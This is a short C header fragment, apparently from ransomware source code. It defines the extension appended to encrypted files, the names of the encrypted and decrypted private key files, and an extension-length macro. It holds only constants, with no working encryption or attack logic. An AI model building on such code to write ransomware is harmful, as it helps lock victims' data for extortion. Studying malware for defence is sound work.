/* Extension of each file encrypted. */
#define RANSOMWARE_EXTENSION	L".rans"
/* Name of the encrypted private key file. */
#define ENC_PK_FILE_NAME		L"pk.dat"
/* Name of the decrypted private key file. */
#define DEC_PK_FILE_NAME		L"pk.dec"

/* Size of the ransomware extension in wchar_t. */
#define SIZE_OF_EXTENSION ((sizeof(RANSOMWARE_EXTENSION) - 1) / sizeof(wchar_t))